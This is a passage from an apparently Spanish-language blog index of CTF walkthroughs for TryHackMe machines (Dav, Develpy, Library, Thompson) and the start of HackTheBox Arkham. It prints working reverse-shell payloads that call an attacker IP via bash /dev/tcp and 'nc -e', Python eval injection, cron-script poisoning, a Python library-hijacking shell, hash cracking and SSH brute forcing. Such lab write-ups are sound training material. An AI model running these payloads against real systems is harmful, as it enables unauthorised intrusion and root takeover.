\u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably\rSession completed\rroot@kali:~/trymehack/anonforce# Nos logeamos en el servicio de ssh con las credenciales de root y logramos obtener nuestra flag root.txt.\n","description":"Anonforce es una maquina de TryHackMe originalmente para Bsides Guatemala, encontramos un servicio FTP el cual contiene un backup encriptado y su respectiva llave, utilizando John obtuvimos la contraseña, dentro del backup encontramos una copia del archivo /etc/shadow, nuevamente con John obtuvimos la contraseña del usuario root que finalmente nos dio acceso privilegiado.","id":192,"section":"posts","tags":["ftp"],"title":"TryHackMe - Anonforce","uri":"https://sckull.github.io/posts/anonforce/"},{"content":"\rDav es una maquina de TryHackMe originalmente para Bsides Guatemala, encontramos credenciales encriptadas en la pagina web las cuales utilizamos para obtener una shell inversa utilizando Cadaver. Para realizar la lectura de la flag root.txt utilizamos Cat con Sudo.\nRoom Titulo Dav Descripción boot2root machine for FIT and bsides guatemala CTF Puntos 60 Dificultad Facil Maker stuxnet MASSCAN \u0026amp; NMAP Escaneo de puertos udp/tcp y sus servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 root@kali:~/trymehack/dav# masscan -p1-65535,U:1-65535 10.10.142.11 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-09-03 07:41:09 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.142.11 # Nmap 7.70 scan initiated Tue Sep 3 03:45:18 2019 as: nmap -sC -sV -o nmap.scan 10.10.142.11 Nmap scan report for 10.10.142.11 Host is up (0.26s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Sep 3 03:46:50 2019 -- 1 IP address (1 host up) scanned in 92.13 seconds WHATWEB HTTP Pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 root@kali:~/trymehack/dav# gobuster dir -u 10.10.142.11 -w /usr/share/wordlists/dirb/common.txt -n -x php,html,txt -t 15 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.142.11 [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,html,txt [+] No status: true [+] Timeout: 10s =============================================================== 2019/09/03 03:49:48 Starting gobuster =============================================================== /index.html /index.html /server-status /webdav =============================================================== 2019/09/03 03:53:38 Finished =============================================================== WEBDAV Visitamos /webdav e ingresamos las credenciales por default.\n1 2 Username: wampp Password: xampp Encontramos un archivo con usuario y contraseña.\n1 2 #passwd.dav wampp:$apr1$Wm2VTkFK$PVNRQv7kzqXQIHe14qKA91 Utilizamos hashcat para crackear la contraseña junto con el diccionario rockyou.\n1 hashcat64.bin -m 1600 -o pass.txt dav_hash.txt rockyou.txt --force SHELL - CADAVER Utilizamos cadaver para poder subir una shell inversa, con las credenciales por default.\n1 2 \u0026lt;?php exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.0.0.10/1234 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); Visitamos nuestra shell.php logrando ejecutar nuestra shell inversa y obtener acceso con el usuario www-data.\nUSER FLAG Vemos nuestra flag user.txt en la carpeta principal de Merlin.\nPRIVILEGE ESCALATION Hacemos una enumeracion rapida con el comando sudo -l -l, y vemos que podemos ejecutar cat con sudo. Utilizamos cat para obtener nuestra flag root.txt.\n","description":"Dav es una maquina de TryHackMe originalmente para Bsides Guatemala, encontramos credenciales encriptadas en la pagina web las cuales utilizamos para obtener una shell inversa utilizando Cadaver. Para realizar la lectura de la flag root.txt utilizamos Cat con Sudo.","id":193,"section":"posts","tags":["webdav","cadaver"],"title":"TryHackMe - Dav","uri":"https://sckull.github.io/posts/dav/"},{"content":"\rDevelpy es una maquina de TryHackMe originalmente para Bsides Guatemala, presenta una vulnerabilidad en script de Python a la escucha de instrucciones donde ejecutamos una shell inversa, tambien encontramos un reto de Esteganografia que nos dio acceso a un siguiente usuario por SSH. Para escalar privilegios modificamos un script utilizado por un CronJob, una alternativa era una aplicacion en Django que permitia la ejecucion de scripts en python.\nRoom Titulo Develpy Descripción boot2root machine for FIT and bsides Guatemala CTF Puntos 60 Dificultad Media Maker stuxnet MASSCAN \u0026amp; NMAP Escaneo de puertos udp/tcp y sus servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 root@kali:~/trymehack/develpy# masscan -p1-65535,U:1-65535 10.10.100.133 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-09-03 23:20:18 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 10000/tcp on 10.10.100.133 Discovered open port 22/tcp on 10.10.100.133 root@kali:~/trymehack/develpy# nmap --script firewall-bypass 10.10.100.133 Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-03 19:36 EDT Nmap scan report for 10.10.100.133 Host is up (0.16s latency). Not shown: 998 closed ports PORT STATE SERVICE 22/tcp open ssh 10000/tcp open snet-sensor-mgmt Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-03 19:38 EDT Nmap scan report for 10.10.100.133 Host is up (0.19s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 10000/tcp open snet-sensor-mgmt? | fingerprint-strings: | GenericLines: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 0 | SyntaxError: unexpected EOF while parsing | GetRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; | NameError: name \u0026#39;GET\u0026#39; is not defined | HTTPOptions, RTSPRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; | NameError: name \u0026#39;OPTIONS\u0026#39; is not defined | NULL: | Private 0days |_ Please enther number of exploits to send??: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port10000-TCP:V=7.70%I=7%D=9/3%Time=5D6EF9B4%P=x86_64-pc-linux-gnu%r(NU SF:LL,48,\u0026#34;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Private\\x200days\\r\\n\\r\\n\\x20 SF:Please\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20\u0026#34;)%r SF:(GetRequest,136,\u0026#34;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Private\\x200days\\r SF:\\n\\r\\n\\x20Please\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\ SF:?:\\x20Traceback\\x20\\(most\\x20recent\\x20call\\x20last\\):\\r\\n\\x20\\x20File\\ SF:x20\\\u0026#34;\\./exploit\\.py\\\u0026#34;,\\x20line\\x206,\\x20in\\x20\u0026lt;module\u0026gt;\\r\\n\\x20\\x20\\x20\\ SF:x20num_exploits\\x20=\\x20int\\(input\\(\u0026#39;\\x20Please\\x20enther\\x20number\\x20 SF:of\\x20exploits\\x20to\\x20send\\?\\?:\\x20\u0026#39;\\)\\)\\r\\n\\x20\\x20File\\x20\\\u0026#34;\u0026lt;string SF:\u0026gt;\\\u0026#34;,\\x20line\\x201,\\x20in\\x20\u0026lt;module\u0026gt;\\r\\nNameError:\\x20name\\x20\u0026#39;GET\u0026#39;\\x20 SF:is\\x20not\\x20defined\\r\\n\u0026#34;)%r(HTTPOptions,13A,\u0026#34;\\r\\n\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20Private\\x200days\\r\\n\\r\\n\\x20Please\\x20enther\\x20number\\x20of SF:\\x20exploits\\x20to\\x20send\\?\\?:\\x20Traceback\\x20\\(most\\x20recent\\x20cal SF:l\\x20last\\):\\r\\n\\x20\\x20File\\x20\\\u0026#34;\\./exploit\\.py\\\u0026#34;,\\x20line\\x206,\\x20in SF:\\x20\u0026lt;module\u0026gt;\\r\\n\\x20\\x20\\x20\\x20num_exploits\\x20=\\x20int\\(input\\(\u0026#39;\\x20P SF:lease\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20\u0026#39;\\)\\) SF:\\r\\n\\x20\\x20File\\x20\\\u0026#34;\u0026lt;string\u0026gt;\\\u0026#34;,\\x20line\\x201,\\x20in\\x20\u0026lt;module\u0026gt;\\r\\nNa SF:meError:\\x20name\\x20\u0026#39;OPTIONS\u0026#39;\\x20is\\x20not\\x20defined\\r\\n\u0026#34;)%r(RTSPReque SF:st,13A,\u0026#34;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Private\\x200days\\r\\n\\r\\n\\x2 SF:0Please\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20Tra SF:ceback\\x20\\(most\\x20recent\\x20call\\x20last\\):\\r\\n\\x20\\x20File\\x20\\\u0026#34;\\./e SF:xploit\\.py\\\u0026#34;,\\x20line\\x206,\\x20in\\x20\u0026lt;module\u0026gt;\\r\\n\\x20\\x20\\x20\\x20num_ex SF:ploits\\x20=\\x20int\\(input\\(\u0026#39;\\x20Please\\x20enther\\x20number\\x20of\\x20exp SF:loits\\x20to\\x20send\\?\\?:\\x20\u0026#39;\\)\\)\\r\\n\\x20\\x20File\\x20\\\u0026#34;\u0026lt;string\u0026gt;\\\u0026#34;,\\x20l SF:ine\\x201,\\x20in\\x20\u0026lt;module\u0026gt;\\r\\nNameError:\\x20name\\x20\u0026#39;OPTIONS\u0026#39;\\x20is\\x2 SF:0not\\x20defined\\r\\n\u0026#34;)%r(GenericLines,13B,\u0026#34;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20Private\\x200days\\r\\n\\r\\n\\x20Please\\x20enther\\x20number\\x20of\\x20 SF:exploits\\x20to\\x20send\\?\\?:\\x20Traceback\\x20\\(most\\x20recent\\x20call\\x2 SF:0last\\):\\r\\n\\x20\\x20File\\x20\\\u0026#34;\\./exploit\\.py\\\u0026#34;,\\x20line\\x206,\\x20in\\x20 SF:\u0026lt;module\u0026gt;\\r\\n\\x20\\x20\\x20\\x20num_exploits\\x20=\\x20int\\(input\\(\u0026#39;\\x20Pleas SF:e\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20\u0026#39;\\)\\)\\r\\n SF:\\x20\\x20File\\x20\\\u0026#34;\u0026lt;string\u0026gt;\\\u0026#34;,\\x20line\\x200\\r\\n\\x20\\x20\\x20\\x20\\r\\n\\x20\\ SF:x20\\x20\\x20\\^\\r\\nSyntaxError:\\x20unexpected\\x20EOF\\x20while\\x20parsing\\ SF:r\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 152.23 seconds PYTHON INPUT En el puerto 10000 encontramos un script que nos pide un numero para poder enviar ese numero de paquetes al localhost.\nKING - USER Le pasamos codigo python para ejecucion de comandos y vemos el resultado del comando enviado.\n1 __import__(\u0026#39;os\u0026#39;).system(\u0026#39;id\u0026#39;) Le pasamos una shell inversa\n1 __import__(\u0026#39;os\u0026#39;).system(\u0026#39;nc -e /bin/sh 10.8.1.72 1337\u0026#39;) Obtenemos una shell con el usuario king y la flag user.txt.\nESTEGANOGRAFIA En la carpeta principal encontramos una imagen con el nombre de credentials.png, lo copiamos a nuestra maquina.\nLa imagene contiene distintos colores, para poder decodificar la imagen utilizamos la pagina de npiet.\nImagen con credenciales\n1 king:c00ffe123! SSH - KING Nos logeamos con las credenciales que encontramos en la imagen y obtenemos acceso con el usuario king nuevamente.\nPRIVILEGE ESCALATION Utilizamos pspy para ver los cronjobs que se ejecuta, vemos que el usuario root ejecuta el archivo root.sh y run.sh que se encuentra en la carpeta principal del usuario king.\nCambiamos el nombre del archivo root.sh a root.sh.bak y creamos un nuevo archivo con nuestra shell inversa.\n1 echo \u0026#34;nc -e /bin/sh 10.8.1.72 1338\u0026#34; \u0026gt;\u0026gt; root.sh Obtenemos una shell inversa con el usuario root y nuestra flag root.txt.\nALTERNATIVE ROOT - DJANGO Encontramos que en el puerto 8080 esta corriendo un servicio de python o una pagina de django, como pudimos observar en la lista de pspy. Utilizamos ssh para traer localmente el puerto 8080 con las credenciales del usuario King.\nEncontramos una pagina escrita en django en la cual se puede enviar un archivo de python.\nSimple upload\nCreamos un archivo con una shell inversa en python.\nSubimos nuestro archivo python, esperamos hasta que el cronjob ejecute el archivo root.sh, el cual ejecuta cualquier archivo python que se encuentra en la carpetan /root/company/media/*.py.\nEsperamos hasta que se ejecute el cronjob y nos da una shell inversa con el usuario root.\nTambien vemos nuestro archivo que se subio a la carpeta del usuario root.\n","description":"Develpy es una maquina de TryHackMe originalmente para Bsides Guatemala, presenta una vulnerabilidad en script de Python a la escucha de instrucciones donde ejecutamos una shell inversa, tambien encontramos un reto de Esteganografia que nos dio acceso a un siguiente usuario por SSH. Para escalar privilegios modificamos un script utilizado por un CronJob, una alternativa era una aplicacion en Django que permitia la ejecucion de scripts en python.","id":194,"section":"posts","tags":["steganography","exec","eval","cron"],"title":"TryHackMe - Develpy","uri":"https://sckull.github.io/posts/develpy/"},{"content":"\rLibrary es una maquina de TryHackMe originalmente para Bsides Guatemala, realizamos un ataque de fuerza bruta para obtener acceso. Descubrimos un script el cual ejecutamos con sudo y realizamos Python Library Hijacking para obtener acceso root.\nRoom Titulo Library Descripción boot2root machine for FIT and bsides guatemala CTF Puntos 60 Dificultad Facil Maker stuxnet MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y sus servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 root@kali:~/trymehack/library# masscan -p1-65535,U:1-65535 10.10.184.190 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-09-03 08:19:17 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.184.190 Discovered open port 80/tcp on 10.10.184.190 Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-03 04:22 EDT Nmap scan report for 10.10.184.190 Host is up (0.21s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA) | 256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA) |_ 256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Welcome to Blog - Library Machine Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.64 seconds HTTP Pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 root@kali:~/trymehack/library# gobuster dir -u 10.10.184.190 -w /usr/share/wordlists/dirb/common.txt -n -x php,html,txt -t 15 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.184.190 [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,html,txt [+] No status: true [+] Timeout: 10s =============================================================== 2019/09/03 04:25:57 Starting gobuster =============================================================== /images /index.html /index.html /robots.txt /robots.txt /server-status =============================================================== 2019/09/03 04:31:35 Finished =============================================================== ROBOTS.TXT Encontramos una pista en robots.txt la que indica el nombre del \u0026ldquo;wordlist rockyou\u0026rdquo;.\nENUM USERS - SSH Utilizamos OpenSSH 7.2p2 - Username Enumeration para enumerar los usuarios dentro del servicio SSH, los usuarios que enumeramos son los que aparecen como comentarios en la pagina principal y el autor del primer post.\n1 2 3 4 5 root www-data meliodas anonymous Anonymous HYDRA Utilizamos hydra con el wordlist de rockyou y nuestro pequeño wordlist de usuarios, logrando obtener la contraseña para el usuario Meliodas.\nUSER - MELIODAS Obtenemos nuestra flag user.txt al logearnos en el servicio ssh con las credenciales encontradas.\n1 2 login: meliodas password: iloveyou1 PRIVILEGE ESCALATION Utilizamos sudo -l -l y encontramos que podemos ejecutar python en cualquiera de sus versiones pasandole un script que esta dentro de nuestra carpeta principal.\nEl script bak.py utiliza las librerias os y zipfile, vamos a crear el archivo zipfile.py el cual va contener una shell inversa, al ejecutarse bak.py va a ejecutar nuestro script esto sucedera porque en la variable $PATH se encuentra primero nuestra carpeta principal.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import os import pty import socket lhost = \u0026#34;10.8.1.72\u0026#34; lport = 1337 ZIP_DEFLATED = 0 class ZipFile: def close(*args): return def write(*args): return def __init__(self, *args): return s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) os.putenv(\u0026#34;HISTFILE\u0026#34;,\u0026#39;/dev/null\u0026#39;) pty.spawn(\u0026#34;/bin/bash\u0026#34;) s.close() Ejecutamos con sudo:\n1 sudo /usr/bin/python /home/meliodas/bak.py Obtenemos una shell como usuario root y nuestra flag root.txt.\n","description":"Library es una maquina de TryHackMe originalmente para Bsides Guatemala, realizamos un ataque de fuerza bruta para obtener acceso. Descubrimos un script el cual ejecutamos con sudo y realizamos Python Library Hijacking para obtener acceso root.","id":195,"section":"posts","tags":["python library hijacking","hydra"],"title":"TryHackMe - Library","uri":"https://sckull.github.io/posts/library/"},{"content":"\rThompson es una maquina de TryHackMe originalmente para Bsides Guatemala, donde ingresamos con credenciales por defecto en Tomcat para luego obtener una shell generando un archivo WAR y ejecutandolo. Escalamos privilegios editando un fichero utilizado por un CronJob.\nRoom Titulo Thompson Descripción boot2root machine for FIT and bsides guatemala CTF Puntos 160 Dificultad Facil Maker stuxnet MASSCAN \u0026amp; NMAP Escaneo de puertos udp/tcp y sus servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 root@kali:~/trymehack/thompson# masscan -p1-65535,U:1-65535 10.10.3.147 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-09-03 09:27:46 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 8080/tcp on 10.10.3.147 Discovered open port 22/tcp on 10.10.3.147 # Nmap 7.70 scan initiated Tue Sep 3 05:34:12 2019 as: nmap -sV -sC -p8080,22 -o nmap.scan 10.10.3.147 Nmap scan report for 10.10.3.147 Host is up (0.18s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA) | 256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA) |_ 256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519) 8080/tcp open http Apache Tomcat 8.5.5 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/8.5.5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Sep 3 05:34:26 2019 -- 1 IP address (1 host up) scanned in 14.01 seconds HTTP - PUERTO 8080 Pagina en el puerto 8080 nos muestra que esta corriendo thompson.\nTOMCAT - DEFAULT CREDENTIALS Utilizamos las credenciales por default y el panel de tomcat para iniciar sesion.\nREVERSE SHELL - JSP Creamos nuestro payload con msfvenom y ponemos a la escucha metasploit.\nSubimos nuestro archivo shell.war y al abrirlo se ejecutará nuestra shell.\nObtenemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Utilizamos pspy para ver los cronjobs que se ejecutan. Vemos un archivo que se ejecuta y este se encuentra en /home/jack/id.sh.\nAgregamos una shell inversa al archivo id.sh y esperamos hasta que se ejecute de nuevo.\n1 echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.1.72/1338 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; script.sh Obtenemos nuestra shell como usuario root y nuestra flag root.txt.\n","description":"Thompson es una maquina de TryHackMe originalmente para Bsides Guatemala, donde ingresamos con credenciales por defecto en Tomcat para luego obtener una shell generando un archivo WAR y ejecutandolo. Escalamos privilegios editando un fichero utilizado por un CronJob.","id":196,"section":"posts","tags":["metasploit","cron"],"title":"TryHackMe - Thompson","uri":"https://sckull.github.io/posts/thompson/"},{"content":"\rArkham de HackTheBox con SO Windows, Encontramos un backup en SMB encriptado con binwalk obtuvimos archivos, uno de ellos es la configuracion de la \u0026ldquo;applicacion\u0026rdquo;, mediante este ultimo explotamos una vulnerabilidad de deserializacion en java utilizando el codigo de Apache MyFaces junto con ysoserial, lo que nos dio acceso a la maquina. Para el movimiento lateral utilizamos powershell con credenciales de borradores de correo electronico dentro de un backup. Finalmente cambiando de recurso compartido localmente logramos acceder a la carpeta del administrador.\nInformacion de la Maquina Nombre Arkham OS Windows Puntos 30 Dificultad Media IP 10.10.10.130 Maker MinatoTW\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.8, 8.1, 6, 4, 1.9],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[6, 10, 5, 5, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon Masscan \u0026amp; nmap Escaneo de puertos tcp/udp.\n1 2 3 4 5 6 7 8 9 10 11 12 root@sckull:~/htb/arkham# masscan -p1-65535,U:1-65535 10.10.10.130 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-25 19:10:12 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49666/tcp on 10.10.10.130 Discovered open port 139/tcp on 10.10.10.130 Discovered open port 445/tcp on 10.10.10.130 Discovered open port 135/tcp on 10.10.10.130 Discovered open port 8080/tcp on 10.10.10.130 Discovered open port 49667/tcp on 10.10.10.130 Escaneo de servicios en puertos anteriormente encontrados.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 root@sckull:~/htb/arkham# nmap -sV -p 135,139,445,8080,49666,49667 10.10.10.130 Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-25 19:13 GMT Nmap scan report for 10.10.10.130 Host is up (0.36s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 8080/tcp open http Apache Tomcat 8.5.37 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 68.49 seconds SMB Buscamos los sharenames a los que tengamos acceso.\n1 2 3 4 5 6 7 8 9 10 11 12 13 root@sckull:~/htb/arkham# smbclient -L 10.10.10.130 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin BatShare Disk Master Wayne\u0026#39;s secrets C$ Disk Default share IPC$ IPC Remote IPC Users Disk Reconnecting with SMB1 for workgroup listing. Connection to 10.10.10.130 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Failed to connect with SMB1 -- no workgroup available SMB - BatShare Nos conectamos al sharename.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 root@sckull:~/htb/arkham# smbclient \\\\\\\\10.10.10.130\\\\BatShare Enter WORKGROUP\\root\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; smb: \\\u0026gt; ls . D 0 Sun Feb 3 13:00:10 2019 .. D 0 Sun Feb 3 13:00:10 2019 appserver.zip A 4046695 Fri Feb 1 06:13:37 2019 5158399 blocks of size 4096. 2123866 blocks available smb: \\\u0026gt; mget * Get file appserver.zip? y getting file \\appserver.zip of size 4046695 as appserver.zip (265.1 KiloBytes/sec) (average 265.1 KiloBytes/sec) smb: \\\u0026gt; 1 2 3 4 5 6 root@sckull:~/htb/arkham# unzip appserver.zip Archive: appserver.zip inflating: IMPORTANT.txt inflating: backup.img root@sckull:~/htb/arkham# ls appserver.zip backup.img IMPORTANT.txt tmp Encontramos un archivo llamado appserver.zip al descomprimir dicho archivo nos muestra dos archivos backup.img e IMPORTANT.txt.\nIMPORTANT.txt\n1 Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn\u0026#39;t have unauthenticated access to it. - Bruce file backup.img\n1 backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e BINWALK - backup.img\nUtilizamos binwalk para ver el contenido del archivo backup.img.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 LUKS_MAGIC version 0x1 aes sha256 519168 0x7EC00 Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995 544768 0x85000 Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995 551936 0x86C00 Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995 8388608 0x800000 Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995 8542755 0x825A23 Zip archive data, at least v1.0 to extract, name: Mask/tomcat-stuff/ 8542831 0x825A6F Zip archive data, at least v2.0 to extract, compressed size: 1006, uncompressed size: 2208, name: Mask/tomcat-stuff/tomcat-users.xml 8543929 0x825EB9 Zip archive data, at least v2.0 to extract, compressed size: 1151, 